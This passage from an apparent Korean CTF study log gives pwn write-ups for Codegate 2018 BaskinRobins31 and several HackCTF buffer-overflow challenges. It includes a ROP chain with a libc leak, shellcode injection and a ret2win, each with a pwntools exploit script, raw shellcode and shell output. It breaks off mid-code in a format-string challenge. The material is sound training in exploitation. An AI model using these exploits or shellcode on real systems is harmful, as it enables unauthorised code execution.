class="pl-s1">log</span>.<span class="pl-en">info</span>(<span class="pl-s">‘read_offset : {}’</span>.<span class="pl-en">format</span>(<span class="pl-en">hex</span>(<span class="pl-s1">read_offset</span>)))</p><p><span class="pl-c"># BOF</span><br><span class="pl-s1">payload</span> <span class="pl-c1">=</span> <span class="pl-s">“A”</span> <span class="pl-c1">*</span> <span class="pl-c1">184</span> <span class="pl-c"># Buffer + SFP</span></p><p><span class="pl-c"># ROP Channing</span></p><p><span class="pl-c"># read(1, read_got, 8);</span><br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p64</span>(<span class="pl-s1">pppr</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p64</span>(<span class="pl-c1">1</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p64</span>(<span class="pl-s1">read_got</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p64</span>(<span class="pl-c1">8</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p64</span>(<span class="pl-s1">write_plt</span>)</p><p><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p64</span>(<span class="pl-s1">pppr</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p64</span>(<span class="pl-c1">0</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p64</span>(<span class="pl-s1">bss</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p64</span>(<span class="pl-c1">8</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p64</span>(<span class="pl-s1">read_plt</span>)</p><p><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p64</span>(<span class="pl-s1">pppr</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p64</span>(<span class="pl-c1">0</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p64</span>(<span class="pl-s1">read_got</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p64</span>(<span class="pl-c1">8</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p64</span>(<span class="pl-s1">read_plt</span>)</p><p><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p64</span>(<span class="pl-s1">pr</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p64</span>(<span class="pl-s1">bss</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p64</span>(<span class="pl-s1">read_plt</span>)</p><p><span class="pl-s1">p</span>.<span class="pl-en">sendlineafter</span>(<span class="pl-s">“(1-3)<span class="pl-cce">\n</span>“</span>, <span class="pl-s1">payload</span>)</p><p><span class="pl-s1">leak</span> <span class="pl-c1">=</span> <span class="pl-en">u64</span>(<span class="pl-s1">p</span>.<span class="pl-en">recvuntil</span>(<span class="pl-s">‘<span class="pl-cce">\x7f</span>‘</span>)[<span class="pl-c1">-</span><span class="pl-c1">6</span>:].<span class="pl-en">ljust</span>(<span class="pl-c1">8</span>, <span class="pl-s">‘<span class="pl-cce">\x00</span>‘</span>))<br><span class="pl-s1">libc_base</span> <span class="pl-c1">=</span> <span class="pl-s1">leak</span> <span class="pl-c1">-</span> <span class="pl-s1">read_offset</span><br><span class="pl-s1">system</span> <span class="pl-c1">=</span> <span class="pl-s1">libc_base</span> <span class="pl-c1">+</span> <span class="pl-s1">system_offset</span><br><span class="pl-s1">log</span>.<span class="pl-en">info</span>(<span class="pl-s">‘libc_base : {}’</span>.<span class="pl-en">format</span>(<span class="pl-en">hex</span>(<span class="pl-s1">libc_base</span>)))<br><span class="pl-s1">log</span>.<span class="pl-en">info</span>(<span class="pl-s">‘system : {}’</span>.<span class="pl-en">format</span>(<span class="pl-en">hex</span>(<span class="pl-s1">system</span>)))</p><p><span class="pl-s1">p</span>.<span class="pl-en">send</span>(<span class="pl-s">“/bin/sh<span class="pl-cce">\x00</span>“</span>)<br><span class="pl-s1">p</span>.<span class="pl-en">sendline</span>(<span class="pl-en">p64</span>(<span class="pl-s1">system</span>))</p><p><span class="pl-s1">p</span>.<span class="pl-en">interactive</span>()</p><p><span class="pl-c"># 이것 저것 확인한다고, 좀 지져분함.</span></pre></div></p><pre><code>pocas@pocas-VirtualBox:~/pwn/codegate/2018/BaskinRobins31$ python exploit.py [+] Starting local process './BaskinRobins31': pid 16607[*] '/home/pocas/pwn/codegate/2018/BaskinRobins31/BaskinRobins31'    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)[*] '/lib/x86_64-linux-gnu/libc-2.27.so'    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled[*] pppr : 0x40087a[*] bss : 0x602090[*] read_plt : 0x400700[*] read_got : 0x602040[*] write_plt : 0x4006d0[*] system_offset : 0x4f550[*] read_offset : 0x110140[*] libc_base : 0x7f621a53c000[*] system : 0x7f621a58b550[*] Switching to interactive mode\x00$ lsBaskinRobins31    exploit.py  flag$ cat flagflag&#123;The Korean name of "Puss in boots" is "My mom is an alien"&#125;$  </code></pre><blockquote><p>FLAG : flag{The Korean name of "Puss in boots" is "My mom is an alien"}</p></blockquote><hr><h2><a id="user-content-pwn-d5-20210129" class="anchor" aria-hidden="true" href="#pwn-d5-20210129"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>PWN D+5 (2021.01.29)<br></h2><hr><p>HackCTF Challenge : 내 버퍼가 흘러넘친다!!!</p><p><strong>이번에는 BOF 취약점을 이용해서 쉬운 쉘 코드 관련 문제를 하나 풀어보겠습니다.</strong><br></p><div class="highlight highlight-source-c"><pre><span class="pl-k">int</span> __cdecl <span class="pl-en">main</span>(<span class="pl-k">int</span> argc, <span class="pl-k">const</span> <span class="pl-k">char</span> **argv, <span class="pl-k">const</span> <span class="pl-k">char</span> **envp){  <span class="pl-k">char</span> s; <span class="pl-c"><span class="pl-c">//</span> [esp+0h] [ebp-14h]</span><p>  <span class="pl-c1">setvbuf</span>(stdout, <span class="pl-c1">0</span>, <span class="pl-c1">2</span>, <span class="pl-c1">0</span>);<br>  <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">“</span>Name : <span class="pl-pds">“</span></span>);<br>  <span class="pl-c1">read</span>(<span class="pl-c1">0</span>, &amp;name, <span class="pl-c1">0x32u</span>);<br>  <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">“</span>input : <span class="pl-pds">“</span></span>);<br>  <span class="pl-c1">gets</span>(&amp;s);<br>  <span class="pl-k">return</span> <span class="pl-c1">0</span>;<br>}</pre></div></p><p><strong>코드를 보면 s 변수를 14h 만큼 생성해주고, read 함수를 이용해서 name을 입력 받고, printf 함수로 출력하고, 또 gets 함수를 이용해서 s를 입력 받는 것을 볼 수 있습니다. 여기서 gets 함수로 입력값을 받고, 입력값의 대한 검증이 없기 때문에 BOF 취약점이 발생합니다. 그래서 그냥 name 변수에 쉘코드를 넣어주고, RET 값으로 name의 주소를 주면 된다.</strong><br></p><pre><code>   0x080484f4 &lt;+41&gt;:    push   0x804a060   0x080484f9 &lt;+46&gt;:    push   0x0   0x080484fb &lt;+48&gt;:    call   0x8048370 &lt;read@plt&gt;</code></pre><p><strong>gdb를 이용해서 name의 주소가 0x804a060라는 것을 알 수 있습니다..</strong><br></p><ul><li>시나리오</li></ul><ol><li>name 변수에 쉘 코드를 입력해준다. 쉘 코드는 그냥 검색해서 구했다.</li><li>BOF 취약점을 이용해서 RET를 name의 주수로 덮어준다.</li></ol><div class="highlight highlight-source-python"><pre><span class="pl-k">from</span> <span class="pl-s1">pwn</span> <span class="pl-k">import</span> <span class="pl-c1">*</span> <span class="pl-s1">p</span> <span class="pl-c1">=</span> <span class="pl-en">remote</span>(<span class="pl-s">"ctf.j0n9hyun.xyz"</span>, <span class="pl-c1">3003</span>)<p><span class="pl-s1">shellcode</span> <span class="pl-c1">=</span> <span class="pl-s">“<span class="pl-cce">\x31</span><span class="pl-cce">\xC9</span><span class="pl-cce">\x8D</span><span class="pl-cce">\x41</span><span class="pl-cce">\x0B</span><span class="pl-cce">\x99</span><span class="pl-cce">\x68</span><span class="pl-cce">\x2F</span><span class="pl-cce">\x73</span><span class="pl-cce">\x68</span><span class="pl-cce">\x00</span><span class="pl-cce">\x68</span><span class="pl-cce">\x2F</span><span class="pl-cce">\x62</span><span class="pl-cce">\x69</span><span class="pl-cce">\x6E</span><span class="pl-cce">\x89</span><span class="pl-cce">\xE3</span><span class="pl-cce">\xCD</span><span class="pl-cce">\x80</span>“</span><br><span class="pl-s1">p</span>.<span class="pl-en">sendafter</span>(<span class="pl-s">“Name : “</span>, <span class="pl-s1">shellcode</span>)</p><p><span class="pl-s1">payload</span> <span class="pl-c1">=</span> <span class="pl-s">“A”</span> <span class="pl-c1">*</span> <span class="pl-c1">24</span><br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-c1">0x804a060</span>)<br><span class="pl-s1">p</span>.<span class="pl-en">sendafter</span>(<span class="pl-s">“input : “</span>,<span class="pl-s1">payload</span>)<br><span class="pl-s1">p</span>.<span class="pl-en">interactive</span>()</pre></div></p><pre><code>pocas@pocas-VirtualBox:~/pwn/HackCTF$ python prob.py [+] Opening connection to ctf.j0n9hyun.xyz on port 3003: Done[*] Switching to interactive mode$ cat flag$ cat flagHackCTF&#123;1_l0v3_70p_pwn3r_m4lhyuk&#125;$  </code></pre><blockquote><p>FLAG : HackCTF{1_l0v3_70p_pwn3r_m4lhyuk}</p></blockquote><hr><p>HackCTF Challenge : x64 Buffer Overflow</p><div class="highlight highlight-source-c"><pre><span class="pl-k">int</span> __cdecl <span class="pl-en">main</span>(<span class="pl-k">int</span> argc, <span class="pl-k">const</span> <span class="pl-k">char</span> **argv, <span class="pl-k">const</span> <span class="pl-k">char</span> **envp){  <span class="pl-k">char</span> s; <span class="pl-c"><span class="pl-c">//</span> [rsp+10h] [rbp-110h]</span>  <span class="pl-k">int</span> v5; <span class="pl-c"><span class="pl-c">//</span> [rsp+11Ch] [rbp-4h]</span><p>  <span class="pl-c1">_isoc99_scanf</span>(<span class="pl-s"><span class="pl-pds">“</span><span class="pl-c1">%s</span><span class="pl-pds">“</span></span>, &amp;s, envp);<br>  v5 = <span class="pl-c1">strlen</span>(&amp;s);<br>  <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">“</span>Hello <span class="pl-c1">%s</span><span class="pl-cce">\n</span><span class="pl-pds">“</span></span>, &amp;s);<br>  <span class="pl-k">return</span> <span class="pl-c1">0</span>;<br>}</pre></div></p><p><strong>코드를 보면 scanf 함수를 이용해서 s를 입력 받고 있습니다. 하지만 길이에 대한 검증이 없어 BOF 취약점이 발생합니다.</strong><br></p><div class="highlight highlight-source-c"><pre><span class="pl-k">int</span> <span class="pl-en">callMeMaybe</span>(){  <span class="pl-k">char</span> *path; <span class="pl-c"><span class="pl-c">//</span> [rsp+0h] [rbp-20h]</span>  <span class="pl-k">const</span> <span class="pl-k">char</span> *v2; <span class="pl-c"><span class="pl-c">//</span> [rsp+8h] [rbp-18h]</span>  __int64 v3; <span class="pl-c"><span class="pl-c">//</span> [rsp+10h] [rbp-10h]</span><p>  path = <span class="pl-s"><span class="pl-pds">“</span>/bin/bash<span class="pl-pds">“</span></span>;<br>  v2 = <span class="pl-s"><span class="pl-pds">“</span>-p<span class="pl-pds">“</span></span>;<br>  v3 = <span class="pl-c1">0LL</span>;<br>  <span class="pl-k">return</span> <span class="pl-c1">execve</span>(<span class="pl-s"><span class="pl-pds">“</span>/bin/bash<span class="pl-pds">“</span></span>, &amp;path, <span class="pl-c1">0LL</span>);<br>}</pre></div></p><p><strong>그리고 다른 함수가 뭐가 있나 보니 callMeMaybe라는 함수가 존재했습니다. 해당 함수를 실행시키면 execve 함수를 이용해서 쉘을 실행 시키는 것을 볼 수 있습니다. 그러니 BOF 취약점을 이용해서 RET를 ccallMeMaybe 함수의 주소로 덮으면 될 거 같습니다.</strong><br></p><div class="highlight highlight-source-python"><pre><span class="pl-k">from</span> <span class="pl-s1">pwn</span> <span class="pl-k">import</span> <span class="pl-c1">*</span><span class="pl-s1">p</span> <span class="pl-c1">=</span> <span class="pl-en">remote</span>(<span class="pl-s">"ctf.j0n9hyun.xyz"</span>, <span class="pl-c1">3004</span>)<p><span class="pl-s1">shell_addr</span> <span class="pl-c1">=</span> <span class="pl-c1">0x400606</span></p><p><span class="pl-s1">payload</span> <span class="pl-c1">=</span> <span class="pl-s">“a”</span> <span class="pl-c1">*</span> <span class="pl-c1">280</span><br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p64</span>(<span class="pl-s1">shell_addr</span>)</p><p><span class="pl-s1">p</span>.<span class="pl-en">sendline</span>(<span class="pl-s1">payload</span>)<br><span class="pl-s1">p</span>.<span class="pl-en">interactive</span>()</pre></div></p><pre><code>pocas@pocas-VirtualBox:~/pwn/HackCTF$ python 64bof_basic.py [+] Opening connection to ctf.j0n9hyun.xyz on port 3004: Done[*] Switching to interactive mode$ cat flagHackCTF&#123;64b17_b0f_15_51mpl3_700&#125;$  </code></pre><blockquote><p>FLAG : HackCTF{64b17_b0f_15_51mpl3_700}</p></blockquote><hr><p>HackCTF Challenge : x64 Simple_size_BOF</p><div class="highlight highlight-source-c"><pre><span class="pl-k">int</span> __cdecl <span class="pl-en">main</span>(<span class="pl-k">int</span> argc, <span class="pl-k">const</span> <span class="pl-k">char</span> **argv, <span class="pl-k">const</span> <span class="pl-k">char</span> **envp){  <span class="pl-k">char</span> v4; <span class="pl-c"><span class="pl-c">//</span> [rsp+0h] [rbp-6D30h]</span><p>  <span class="pl-c1">setvbuf</span>(_bss_start, <span class="pl-c1">0LL</span>, <span class="pl-c1">2</span>, <span class="pl-c1">0LL</span>);<br>  <span class="pl-c1">puts</span>(&amp;s);<br>  <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">“</span>buf: <span class="pl-c1">%p</span><span class="pl-cce">\n</span><span class="pl-pds">“</span></span>, &amp;v4);<br>  <span class="pl-c1">gets</span>(&amp;v4);<br>  <span class="pl-k">return</span> <span class="pl-c1">0</span>;<br>}</pre></div></p><p><strong>코드를 보면 printf 함수를 이용해서 v4의 주소를 출력하고, gets 함수를 이용해서 v4의 값을 입력하고 있는 것을 볼 수 있습니다. 이번 문제도 gets 함수로 입력을 받고, 검증 로직이 없어 BOF 취약점이 발생합니다. 그래서 쉘을 실행시켜주는 함수가 있나 확인해 보니 없었고, ROP를 하려고 보호 기법도 확인해보니 아무 것도 되어 있지 않아 그냥 쉘 코드를 박아주기로 했습니다.</strong><br></p><pre><code>pocas@pocas-VirtualBox:~/pwn/HackCTF$ ./Simple_size_bof 삐빅- 자살방지 문제입니다.buf: 0x7ffc7b644760<p>pocas@pocas-VirtualBox:~/pwn/HackCTF$ ./Simple_size_bof<br>삐빅- 자살방지 문제입니다.<br>buf: 0x7ffc99272180</p><p>pocas@pocas-VirtualBox:~/pwn/HackCTF$ ./Simple_size_bof<br>삐빅- 자살방지 문제입니다.<br>buf: 0x7fffcba94780</p><p>pocas@pocas-VirtualBox:~/pwn/HackCTF$<br></code></pre></p><p><strong>바이너리 파일을 실행해보니 buf의 주소가 계속 바뀌는 것을 알 수 있습니다. 아마 ASLR이 적용되어 있는 거 같습니다. 하지만 그냥 바이너리가 실행되는 동시에 출력되는 buf의 주소를 가져와서 사용하면 됩니다. 마찬가지로 64 비트 쉘 코드도 검색해서 구했습니다.</strong><br></p><div class="highlight highlight-source-python"><pre><span class="pl-k">from</span> <span class="pl-s1">pwn</span> <span class="pl-k">import</span> <span class="pl-c1">*</span><span class="pl-s1">p</span> <span class="pl-c1">=</span> <span class="pl-en">remote</span>(<span class="pl-s">"ctf.j0n9hyun.xyz"</span>, <span class="pl-c1">3005</span>)<p><span class="pl-s1">shell_code</span> <span class="pl-c1">=</span> <span class="pl-s">“<span class="pl-cce">\x31</span><span class="pl-cce">\xf6</span><span class="pl-cce">\x48</span><span class="pl-cce">\xbb</span><span class="pl-cce">\x2f</span><span class="pl-cce">\x62</span><span class="pl-cce">\x69</span><span class="pl-cce">\x6e</span><span class="pl-cce">\x2f</span><span class="pl-cce">\x2f</span><span class="pl-cce">\x73</span><span class="pl-cce">\x68</span><span class="pl-cce">\x56</span><span class="pl-cce">\x53</span><span class="pl-cce">\x54</span><span class="pl-cce">\x5f</span><span class="pl-cce">\x6a</span><span class="pl-cce">\x3b</span><span class="pl-cce">\x58</span><span class="pl-cce">\x31</span><span class="pl-cce">\xd2</span><span class="pl-cce">\x0f</span><span class="pl-cce">\x05</span>“</span></p><p><span class="pl-s1">p</span>.<span class="pl-en">recvline</span>()<br><span class="pl-s1">buf_addr</span> <span class="pl-c1">=</span> <span class="pl-en">int</span>(<span class="pl-s1">p</span>.<span class="pl-en">recvline</span>()[<span class="pl-c1">5</span>:], <span class="pl-c1">16</span>)<br><span class="pl-s1">log</span>.<span class="pl-en">info</span>(<span class="pl-s">“buf addr : {}”</span>.<span class="pl-en">format</span>(<span class="pl-en">hex</span>(<span class="pl-s1">buf_addr</span>)))</p><p><span class="pl-s1">payload</span> <span class="pl-c1">=</span> <span class="pl-s1">shell_code</span><br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">“a”</span> <span class="pl-c1">*</span> (<span class="pl-c1">27960</span> <span class="pl-c1">-</span> <span class="pl-en">len</span>(<span class="pl-s1">shell_code</span>)) <span class="pl-c"># buf + sfp - shell_code_length</span><br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p64</span>(<span class="pl-s1">buf_addr</span>)</p><p><span class="pl-s1">p</span>.<span class="pl-en">send</span>(<span class="pl-s1">payload</span>)<br><span class="pl-s1">p</span>.<span class="pl-en">interactive</span>()</pre></div></p><pre><code>pocas@pocas-VirtualBox:~/pwn/HackCTF$ python simple_size_bof.py [+] Opening connection to ctf.j0n9hyun.xyz on port 3005: Done[*] buf addr : 0x7fff99022510[*] Switching to interactive mode$ cat flag$ cat flagHackCTF&#123;s000000_5m4ll_4nd_5m4ll_51z3_b0f&#125;$  </code></pre><blockquote><p>FLAG : HackCTF{s000000_5m4ll_4nd_5m4ll_51z3_b0f}</p></blockquote><hr><p>HackCTF Challenge : Simple_Overflow_ver_2</p><div class="highlight highlight-source-c"><pre><span class="pl-k">int</span> __cdecl <span class="pl-en">main</span>(<span class="pl-k">int</span> argc, <span class="pl-k">const</span> <span class="pl-k">char</span> **argv, <span class="pl-k">const</span> <span class="pl-k">char</span> **envp){  <span class="pl-c1">size_t</span> v3; <span class="pl-c"><span class="pl-c">//</span> ebx</span>  <span class="pl-k">char</span> v5; <span class="pl-c"><span class="pl-c">//</span> [esp+13h] [ebp-89h]</span>  <span class="pl-k">char</span> s[<span class="pl-c1">128</span>]; <span class="pl-c"><span class="pl-c">//</span> [esp+14h] [ebp-88h]</span>  <span class="pl-k">int</span> i; <span class="pl-c"><span class="pl-c">//</span> [esp+94h] [ebp-8h]</span><p>  <span class="pl-c1">setvbuf</span>(stdout, <span class="pl-c1">0</span>, <span class="pl-c1">2</span>, <span class="pl-c1">0</span>);<br>  v5 = <span class="pl-c1">121</span>;<br>  <span class="pl-k">do</span><br>  {<br>    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">“</span>Data : <span class="pl-pds">“</span></span>);<br>    <span class="pl-k">if</span> ( <span class="pl-c1">__isoc99_scanf</span>(<span class="pl-s"><span class="pl-pds">“</span> %[^<span class="pl-cce">\n</span>]s<span class="pl-pds">“</span></span>, s) )<br>    {<br>      <span class="pl-k">for</span> ( i = <span class="pl-c1">0</span>; ; ++i )<br>      {<br>        v3 = i;<br>        <span class="pl-k">if</span> ( v3 &gt;= <span class="pl-c1">strlen</span>(s) )<br>          <span class="pl-k">break</span>;<br>        <span class="pl-k">if</span> ( !(i &amp; <span class="pl-c1">0xF</span>) )<br>          <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">“</span><span class="pl-c1">%p</span>: <span class="pl-pds">“</span></span>, &amp;s[i]);<br>        <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">“</span> <span class="pl-c1">%c</span><span class="pl-pds">“</span></span>, (<span class="pl-k">unsigned</span> __int8)s[i]);<br>        <span class="pl-k">if</span> ( i % <span class="pl-c1">16</span> == <span class="pl-c1">15</span> )<br>          <span class="pl-c1">putchar</span>(<span class="pl-c1">10</span>);<br>      }<br>    }<br>    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">“</span><span class="pl-cce">\n</span>Again (y/n): <span class="pl-pds">“</span></span>);<br>  }<br>  <span class="pl-k">while</span> ( <span class="pl-c1">__isoc99_scanf</span>(<span class="pl-s"><span class="pl-pds">“</span> <span class="pl-c1">%c</span><span class="pl-pds">“</span></span>, &amp;v5) &amp;&amp; (v5 == <span class="pl-c1">121</span> || v5 == <span class="pl-c1">89</span>) );<br>  <span class="pl-k">return</span> <span class="pl-c1">0</span>;<br>}</pre></div></p><p><strong>코드를 보면 scanf 함수를 이용해서 s의 값을 입력해주고, printf로 입력 값을 출력해주고, <code>"Again (y/n): "</code>를 출력해서 한 번 더 입력할 거냐고 묻는다. <code>y</code>를 누르면 다시 입력을 하고, <code>n</code>을 누르면 종료를 합니다. 하지면 s의 크기는 136인데 입력은 무제한으로 받을 수 있어 BOF 취약점이 발생합니다. 그래서 그냥 이번 문제도 shell code를 s에 넣어주고, ret를 s의 주소로 덮어주면 쉘을 딸 수 있습니다.</strong><br></p><div class="highlight highlight-source-python"><pre><span class="pl-k">from</span> <span class="pl-s1">pwn</span> <span class="pl-k">import</span> <span class="pl-c1">*</span><span class="pl-s1">p</span> <span class="pl-c1">=</span> <span class="pl-en">remote</span>(<span class="pl-s">"ctf.j0n9hyun.xyz"</span>, <span class="pl-c1">3006</span>)<p><span class="pl-s1">shell_code</span> <span class="pl-c1">=</span> <span class="pl-s">“<span class="pl-cce">\x31</span><span class="pl-cce">\xC9</span><span class="pl-cce">\x8D</span><span class="pl-cce">\x41</span><span class="pl-cce">\x0B</span><span class="pl-cce">\x99</span><span class="pl-cce">\x68</span><span class="pl-cce">\x2F</span><span class="pl-cce">\x73</span><span class="pl-cce">\x68</span><span class="pl-cce">\x00</span><span class="pl-cce">\x68</span><span class="pl-cce">\x2F</span><span class="pl-cce">\x62</span><span class="pl-cce">\x69</span><span class="pl-cce">\x6E</span><span class="pl-cce">\x89</span><span class="pl-cce">\xE3</span><span class="pl-cce">\xCD</span><span class="pl-cce">\x80</span>“</span></p><p><span class="pl-s1">payload</span> <span class="pl-c1">=</span> <span class="pl-s">“a”</span><br><span class="pl-s1">p</span>.<span class="pl-en">sendlineafter</span>(<span class="pl-s">“Data : “</span>, <span class="pl-s1">payload</span>)</p><p><span class="pl-s1">buf_addr</span> <span class="pl-c1">=</span> <span class="pl-en">int</span>(<span class="pl-s1">p</span>.<span class="pl-en">recvline</span>()[<span class="pl-c1">0</span>:<span class="pl-c1">10</span>], <span class="pl-c1">16</span>)<br><span class="pl-s1">log</span>.<span class="pl-en">info</span>(<span class="pl-s">“buf addr : {}”</span>.<span class="pl-en">format</span>(<span class="pl-en">hex</span>(<span class="pl-s1">buf_addr</span>)))</p><p><span class="pl-s1">p</span>.<span class="pl-en">sendlineafter</span>(<span class="pl-s">“Again (y/n): “</span>, <span class="pl-s">“Y”</span>)</p><p><span class="pl-s1">payload</span> <span class="pl-c1">=</span> <span class="pl-s1">shell_code</span><br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">“a”</span> <span class="pl-c1">*</span> (<span class="pl-c1">140</span> <span class="pl-c1">-</span> <span class="pl-en">len</span>(<span class="pl-s1">shell_code</span>)) <span class="pl-c"># buffer + sfp + shellcode_length</span><br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">buf_addr</span>)</p><p><span class="pl-s1">p</span>.<span class="pl-en">sendlineafter</span>(<span class="pl-s">“Data : “</span>, <span class="pl-s1">payload</span>)<br><span class="pl-s1">p</span>.<span class="pl-en">interactive</span>()</pre></div></p><pre><code>pocas@pocas-VirtualBox:~/pwn/HackCTF$ python simple_overflow_ver2.py [+] Opening connection to ctf.j0n9hyun.xyz on port 3006: Done[*] buf addr : 0xffe73ef0[*] Switching to interactive mode0xffe73ef0:  1 � \x8d A \x0b\x99 h / s hAgain (y/n): $ cat flag$ cat  flagHackCTF&#123;y0u_d1d_7h3_45516nm3n7_5ucc355fully!&#125;$  </code></pre><blockquote><p>FLAG : HackCTF{y0u_d1d_7h3_45516nm3n7_5ucc355fully!}</p></blockquote><hr><h2><a id="user-content-pwn-d6-20210201" class="anchor" aria-hidden="true" href="#pwn-d6-20210201"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>PWN D+6 (2021.02.01)<br></h2><hr><p>HackCTF Challenge : You are silver</p><p>이번 문제는 64 bit FSB 취약점을 이용한 문제를 가져왔습니다. 64 bit는 32 bit와 다르게 레지스터를 출력 후에 스택 정보를 출력해줍니다.<br></p><div class="highlight highlight-source-c"><pre><span class="pl-k">int</span> __cdecl <span class="pl-en">main</span>(<span class="pl-k">int</span> argc, <span class="pl-k">const</span> <span class="pl-k">char</span> **argv, <span class="pl-k">const</span> <span class="pl-k">char</span> **envp){  <span class="pl-k">char</span> s; <span class="pl-c"><span class="pl-c">//</span> [rsp+0h] [rbp-30h]</span>  <span class="pl-k">int</span> v5; <span class="pl-c"><span class="pl-c">//</span> [rsp+28h] [rbp-8h]</span>  <span class="pl-k">int</span> v6; <span class="pl-c"><span class="pl-c">//</span> [rsp+2Ch] [rbp-4h]</span><p>  <span class="pl-c1">setvbuf</span>(stdout, <span class="pl-c1">0LL</span>, <span class="pl-c1">2</span>, <span class="pl-c1">0LL</span>);<br>  v6 = <span class="pl-c1">50</span>;<br>  <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">“</span>Please enter your name<span class="pl-pds">“</span></span>);<br>  <span class="pl-c1">fgets</span>(&amp;s, <span class="pl-c1">46</span>, stdin);<br>  <span class="pl-c1">printf</span>(&amp;s, <span class="pl-c1">46LL</span>);<br>  v5 = <span class="pl-c1">get_tier</span>(v6);<br>  <span class="pl-c1">printf</span>((<span class="pl-k">const</span> <span class="pl-k">char</span> *)v5);<br>  <span class="pl-k">return</span> <span class="pl-c1">0</span>;<br>}</pre></div></p><p>코드를 보면 fgets 함수를 이용해서 46 바이트만큼 s에 입력해주고, printf 함수를 이용해서 출력해주고 있습니다. 하지만 여기서 포맷스트링이 정의되어 있지 않아 FSB 취약점이 발생합니다. 그 후에 get_tier 함수의 반환 값을 v5에 넣고, v5를 출력하는 것을 볼 수 있습니다.<br></p><div class="highlight highlight-source-c"><pre><span class="pl-k">signed</span> __int64 __fastcall <span class="pl-en">get_tier</span>(<span class="pl-k">signed</span> <span class="pl-k">int</span> a1){  <span class="pl-k">signed</span> __int64 result; <span class="pl-c"><span class="pl-c">//</span> rax</span><p>  <span class="pl-k">if</span> ( a1 &gt; <span class="pl-c1">50</span> )<br>  {<br>    <span class="pl-k">if</span> ( a1 &gt; <span class="pl-c1">65</span> || a1 &lt;= <span class="pl-c1">50</span> )<br>    {<br>      <span class="pl-k">if</span> ( a1 &gt; <span class="pl-c1">75</span> || a1 &lt;= <span class="pl-c1">65</span> )<br>      {<br>        <span class="pl-k">if</span> ( a1 &gt; <span class="pl-c1">75</span> )<br>        {<br>          <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">“</span><span class="pl-cce">\n</span>You are challenger.<span class="pl-pds">“</span></span>);<br>          result = <span class="pl-c1">4LL</span>;<br>        }<br>      }<br>      <span class="pl-k">else</span><br>      {<br>        <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">“</span><span class="pl-cce">\n</span>You are master.<span class="pl-pds">“</span></span>);<br>        result = <span class="pl-c1">3LL</span>;<br>      }<br>    }<br>    <span class="pl-k">else</span><br>    {<br>      <span 